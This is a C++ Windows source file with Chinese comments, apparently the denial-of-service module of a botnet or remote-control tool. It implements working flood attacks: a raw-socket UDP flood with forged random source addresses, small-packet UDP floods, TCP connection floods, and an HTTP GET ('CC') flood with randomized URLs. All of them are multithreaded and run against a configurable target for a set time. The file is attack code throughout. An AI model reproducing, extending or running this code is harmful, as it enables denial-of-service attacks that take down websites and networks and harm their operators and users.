#include <windows.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib,"WS2_32.LIB")

#include "..\\..\\common\\macros.h"

/*===========================================常量=============================================*/
CString zIP; //转换前的域名
CString ctsz; //攻击目标域名后缀
char tgtIP[30]="192.168.1.2";//要攻击的目标IP
char zdyBuffer[256];//自定义的Buffer
int tgtPort=80; //攻击IP
int timeout=10; //攻击时间
int SleepTime=5;//缓冲时间
int StopFlag = 1;//是否停止攻击
int z;//攻击线程数
int S1=0,S2=500; //随机数起始与结束
HANDLE h[MAX_PATH];//初始化线程句柄
volatile bool rnd;

//无限CC加强型数据
int countupdate;//是否开启DNS重定位
int datarecv; //是否收包处理
int ccthread;//单次发包数
char yfcs[256];
char cscs[256];



/*--------------------------------------IP与封报校验------------------------------------------*/
typedef struct  _iphdr
{
	unsigned char   h_verlen; //4位手部长度，和4位IP版本号
	unsigned char   tos; //8位类型服务
	unsigned short  total_len; //16位总长度 
	unsigned short  ident; //16位标志
	unsigned short  frag_and_flags; //类型
	unsigned char   ttl; //8位生存时间 
	unsigned char   proto; //8位协议 
	unsigned short  checksum; //ip首部效验和
	unsigned int    sourceIP; //伪造IP地址或本机
	unsigned int    destIP; //攻击的ip地址 
}IP_HEADER, * PIP_HEADER;

USHORT checksum(USHORT *buffer, int size)
{ 
	unsigned long cksum=0;
	while(size >1)
	{
		cksum+=*buffer++;
		size -=sizeof(USHORT);
	}
	if(size)
	{
		cksum += *(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >>16);
	return (USHORT)(~cksum);
}
/*--------------------------------------UDP data----------------------------------------------*/
#define nBufferSize 1024 //UDP 数据包大小
static char pSendBuffer[nBufferSize+60]; //数据大小+封装数据包
static int  iTotalSize=0; //数据包+IP头+UDP头大小和

typedef struct udp_hdr //UDP首部
{
	unsigned short sourceport;  //本机或伪造的端口
	unsigned short destport;  //攻击的IP端口
	unsigned short udp_length;  //UDP地址长度
	unsigned short udp_checksum; //UDP首部校验和
} UDP_HEADER;
/*--------------------------------------SYN data----------------------------------------------*/
typedef struct  _tcphdr
{
	unsigned short  th_sport; //本机端口
	unsigned short  th_dport; //攻击的IP端口
	unsigned int    th_seq; //32位序列号
	unsigned int    th_ack; //32位确认号
	unsigned char   th_lenres; //4位首部长度
	unsigned char   th_flag; //6位标志位 ACK SYN and so on
	unsigned short  th_win; //16位窗口大小 
	unsigned short  th_sum; //16位效验和 
	unsigned short  th_urp; //16位紧急指针
}TCP_HEADER, * PTCP_HEADER;

typedef struct tsd_hdr
{ 
	unsigned long  saddr; //本机地址或伪造地址
	unsigned long  daddr; //目标地址
	char           mbz; 
	char           ptcl; //协议类型
	unsigned short tcpl; //TCP长度
}PSD_HEADER; 
/*-----------------------------ICMP data-----------------------------------------------*/
typedef struct _icmphdr				//定义ICMP首部
{
	BYTE   i_type;					//8位类型
	BYTE   i_code;					//8位代码
	USHORT i_cksum;					//16位校验和 
	USHORT i_id;					//识别号
	USHORT i_seq;					//报文序列号	
	ULONG  timestamp;				//时间戳
}ICMP_HEADER;

/////////////CC tcp数据///////////////////////////////////////////////////////////////
CString rsCS(CString str)
{
    CString NewStr,tempstr,nstr;
	CString CStr,Func;
	char fu;
	int LFunc;
	int i,x=0;
    if (rnd==false) return str;
	srand((unsigned)time( NULL ));
	NewStr=str;
	while ((x=NewStr.Find ("+",0))!=-1)
	{
		tempstr="";
		CStr="";
		nstr=NewStr.Mid (x,3);
		Func=NewStr.Mid (x+1,1);memcpy(&fu, Func, 1);
		LFunc=atoi(NewStr.Mid (x+2,1));
		switch(fu)
		{
		case 'N':
				for(i=0;i<LFunc;i++)
				{tempstr.Format ("%c",48+rand()%10);CStr+=tempstr;}
				break;
		case 'U':
				for(i=0;i<LFunc;i++)
				{tempstr.Format ("%c",65+rand()%26);CStr+=tempstr;}
				break;
		case 'L':
				for(i=0;i<LFunc;i++)
				{tempstr.Format ("%c",97+rand()%26);CStr+=tempstr;}
				break;
		case 'C':
				for(i=0;i<LFunc;i++)
				{tempstr.Format ("%%%c%c%%%c%c",65+rand()%6,48+rand()%10,65+rand()%6,48+rand()%10);CStr+=tempstr;}
				break;
		default:
			tempstr=""	;
			CStr="";
			break;
		}
		NewStr.Replace (nstr,CStr);
	}
	return NewStr;
}
/////////////////////////////////////////////////////////////////////////////////////////
DWORD resolveIP(char *hostName)
{
    hostent *hent;
    char **addresslist;
    DWORD result = 0;

    hent = gethostbyname(hostName);
    if(hent)
    {
        addresslist = hent->h_addr_list;
    
        if (*addresslist) 
        {
            result = *((DWORD *)(*addresslist));
        }
    }

    return result;
}


void wait_for_end()
{
	DWORD s_time = timeout*60*1000;
	Sleep(s_time);
	
	StopFlag=1;
}

SOCKET tcpConnect(char *host, int port) //CC攻击TCP连接函数
{
    SOCKET sock;
	
    sock = socket(AF_INET, SOCK_STREAM, 0);
	
    if(sock == INVALID_SOCKET)
        return sock;
	
    sockaddr_in sin;
	
    DWORD ip = resolveIP(host);
    if(ip == 0)
        ip = inet_addr(host);
	
    sin.sin_addr.s_addr = ip;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
	
	if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
    {
        closesocket(sock);
        return INVALID_SOCKET;
    }
	
    return sock; 
}

/*********************************************************伪造源UDP*******************************************************************/

void rawudpattack() 
{
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2), &WSAData);

	SOCKET    SendSocket; 
	BOOL    Flag; 

	SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if( SendSocket == INVALID_SOCKET ) 
		return; 

	Flag=true;
	if (setsockopt(SendSocket,IPPROTO_IP,IP_HDRINCL,(char*)&Flag,sizeof(Flag))==SOCKET_ERROR)
	{
		printf("setsockopt Error!\n");
		return;
	}

	SOCKADDR_IN addr_in;
	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons(tgtPort);
	addr_in.sin_addr.s_addr=inet_addr(tgtIP);
	if (addr_in.sin_addr.s_addr == INADDR_NONE)
	{   
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(tgtIP)) != NULL)
		 {
		 	memcpy(&(addr_in.sin_addr), hp->h_addr, hp->h_length);
		 	addr_in.sin_family = hp->h_addrtype;
		}
		else
			return;
	}

	for (;;)
	{
		if (StopFlag == 1)
		{
			ExitThread(0);
			return;
		}
		for(int i=0;i<12;i++)
			sendto(SendSocket, pSendBuffer, iTotalSize, 0, (SOCKADDR *)&addr_in, sizeof(addr_in));
		Sleep(SleepTime);
	}
	closesocket(SendSocket);
	WSACleanup();
	return; 
}

void fill_wzudp_buffer()
{
    int i;

    srand((unsigned)time( NULL ));


    i=rand()%512;


	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	char         saddr[20] = {0};
	memset(saddr,0,20);

	char pBuffer[nBufferSize];

	IP_HEADER ipHeader;
	UDP_HEADER udpHeader;

	int iUdpCheckSumSize;
	char *ptr=NULL;
	FillMemory(pBuffer, nBufferSize,i);

	iTotalSize=sizeof(ipHeader) + sizeof(udpHeader)+ nBufferSize;
	wsprintf( saddr, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1 ); 
	ipHeader.h_verlen = (4 << 4) | (sizeof(ipHeader) / sizeof(unsigned long));
	ipHeader.tos=0;
	ipHeader.total_len=htons(iTotalSize);
	ipHeader.ident=0;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_UDP;
	ipHeader.checksum=0;
	ipHeader.destIP=inet_addr(tgtIP);

	udpHeader.sourceport = htons( rand()%60000 + 1 );
	udpHeader.destport = htons(tgtPort);
	udpHeader.udp_length = htons(sizeof(udpHeader) + nBufferSize);
	udpHeader.udp_checksum = 0;

	ptr = NULL;
	ipHeader.sourceIP = inet_addr(saddr);

	ZeroMemory(pSendBuffer, nBufferSize + 60);
	ptr = pSendBuffer;
	iUdpCheckSumSize=0;
	udpHeader.udp_checksum = 0;

	memcpy(ptr, &ipHeader.sourceIP, sizeof(ipHeader.sourceIP));
	ptr += sizeof(ipHeader.sourceIP);
	iUdpCheckSumSize += sizeof(ipHeader.sourceIP);
	
	memcpy(ptr, &ipHeader.destIP, sizeof(ipHeader.destIP));
	ptr += sizeof(ipHeader.destIP);
	iUdpCheckSumSize += sizeof(ipHeader.destIP);
	
	ptr++;
	iUdpCheckSumSize++;
	
	memcpy(ptr, &ipHeader.proto, sizeof(ipHeader.proto));
	ptr += sizeof(ipHeader.proto);
	iUdpCheckSumSize += sizeof(ipHeader.proto);
	
	memcpy(ptr, &udpHeader.udp_length, sizeof(udpHeader.udp_length));
	ptr += sizeof(udpHeader.udp_length);
	iUdpCheckSumSize += sizeof(udpHeader.udp_length);
	
	memcpy(ptr, &udpHeader, sizeof(udpHeader));
	ptr += sizeof(udpHeader);
	iUdpCheckSumSize += sizeof(udpHeader);
	
	memcpy(ptr, pBuffer, nBufferSize);
	iUdpCheckSumSize += nBufferSize;
	
	udpHeader.udp_checksum=checksum((USHORT*)pSendBuffer,iUdpCheckSumSize);
	memcpy(pSendBuffer, &ipHeader, sizeof(ipHeader));
	memcpy(pSendBuffer + sizeof(ipHeader), &udpHeader, sizeof(udpHeader));
	memcpy(pSendBuffer + sizeof(ipHeader) + sizeof(udpHeader), pBuffer, nBufferSize);
}

void StartWZUDP(char ip[30],int port,int mytime,int xc)
{
	
	if (inet_addr(ip)== INADDR_NONE)
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);
	
	
	tgtPort=port;
	timeout=mytime;
	
	StopFlag = -1;
	fill_wzudp_buffer();
	
	for(z=0;z<xc;z++)
	{
		h[z]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rawudpattack, NULL, 0, NULL);
	}
	if(timeout!=0)
	{
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wait_for_end, NULL, 0, NULL);
	}
}

/*********************************************************伪造源UDP结束*******************************************************************/

/*********************************************************UDP碎片*******************************************************************/


void udpsattack()
{
	char senddata[5]="bfyl";
	
	int sendsize=strlen(senddata);
	
	SOCKADDR_IN udpaddr;

	udpaddr.sin_family=AF_INET;
    udpaddr.sin_addr.s_addr=inet_addr(tgtIP);
    udpaddr.sin_port=htons(tgtPort);

	SOCKET s=socket(AF_INET,SOCK_DGRAM,0);

	int nZero = 0;
	setsockopt(s,SOL_SOCKET,SO_SNDBUF,(char *)&nZero,sizeof(nZero));

	for (;;)
	{
		if(StopFlag==1)
		{
			ExitThread(0);
			return;
		}
		for(int i=0;i<5;i++)
			sendto(s,senddata,sendsize,0,(SOCKADDR *)&udpaddr,sizeof(udpaddr));
		Sleep(SleepTime);
	}
	closesocket(s);
	WSACleanup();
}

void StartUDPS(char ip[30],int port,int mytime,int xc)
{

		if (inet_addr(ip)== INADDR_NONE)
		{
			struct hostent *hp = NULL;
			if ((hp = gethostbyname(ip)) != NULL)
			{
				in_addr in;
				memcpy(&in, hp->h_addr, hp->h_length);
				strcpy(tgtIP,inet_ntoa(in));
			}
		}
		else
			strcpy(tgtIP,ip);


		tgtPort=port;
		timeout=mytime;
		StopFlag = -1;

		for(z=0;z<xc;z++)
		{
			h[z]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)udpsattack, NULL, 0, NULL);
		}
		if(timeout != 0)
		{
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wait_for_end, NULL, 0, NULL);
		}
}


/*********************************************************UDP碎片结束*******************************************************************/


/*********************************************************TCP多连接攻击*******************************************************************/

void xpattack()
{
	WSADATA               WSAData;
	WSAStartup(MAKEWORD(2,2) ,&WSAData);
	SOCKADDR_IN sockAddr;
	SOCKET	m_hSocket;
	
	int nSize = 256;
	
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port=htons(tgtPort);
	sockAddr.sin_addr.s_addr = inet_addr(tgtIP);
	
	while(1)
	{
		if (StopFlag == 1)
		{
			ExitThread(1);
			return;
		}
		
		m_hSocket = socket(PF_INET,SOCK_STREAM,0);
		
		for(int ss=0;ss<1024;ss++)
		{
			if (connect(m_hSocket,(SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
			continue;
			closesocket(m_hSocket);
		}
		Sleep(SleepTime);
	}
	WSACleanup();
	return;
}
 

void StartXP(char ip[30],int port,int mytime,int xc)
{
	
	if (inet_addr(ip)== INADDR_NONE)
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);
	
	
	port=tgtPort;
	timeout=mytime;
	if (StopFlag == -1)
		return;
	
	StopFlag=-1;
	
	for(z=0;z<xc;z++)
	{
		h[z]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)xpattack, NULL, 0, NULL);
	}
	if(SleepTime!=0)
	{
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wait_for_end, NULL, 0, NULL);
	}
}

/*********************************************************TCP多连接攻击结束*******************************************************************/


/*********************************************************轮询CC攻击*******************************************************************/


void sjlwattack()
{
	CString url,http,rhost;
	http = zIP;
    rhost = http;
	int sjint=S1;
	while (1)
	{
		char sjsz[256];
		CString Cjsz;
		if(sjint>S2)
		{
			sjint=0;
		}
                 sjint+=1;
		Cjsz.Format(ctsz,sjint);
		strcpy(sjsz,Cjsz);
		url="GET "+rsCS(sjsz)+" HTTP/1.1\r\n"             
			+"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/msword, */*\r\n"
			+"Accept-Language: zh-cn\r\n"
			+"Accept-Encoding: deflate"
			+"\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
			+"\r\nHost:"+rhost
			+"\r\nConnection: Keep-Alive"
			+"\r\n\r\n";
		memset(sjsz,0,256);
		if (StopFlag == 1)
		{
			ExitThread(0);
			return;
		}
		SOCKET S=tcpConnect(tgtIP,tgtPort);
		send(S,url,url.GetLength() ,0);
		closesocket(S);
		Sleep(SleepTime);
	}
}


DWORD WINAPI StartSJLW(LPVOID lp)
{
	LPDDOSST para = (LPDDOSST)lp;
	
	char *ip = para->addr;
	
	int port = para->port;
	
	int time = para->time;
	
	int xc = para->thread;
	
	CString tIP=ip;
	tIP.Delete(0,7);
	zIP=tIP.Left(tIP.Find("/"));
	
	tIP.Delete(0,tIP.Find("/"));
	ctsz=tIP;
	
	S1 = GetTickCount();
	S2 = GetTickCount() + 15;
	
	if (inet_addr(zIP)== INADDR_NONE)
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(zIP)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,zIP);
	
	tgtPort=port;
	timeout=time;
	StopFlag = -1;
	for(z=0;z<xc;z++)
	{
		h[z]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sjlwattack, NULL, 0, NULL);
	}
	if(timeout!=0)
	{
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wait_for_end, NULL, 0, NULL);
	}
}

/*********************************************************轮询CC攻击结束*******************************************************************/

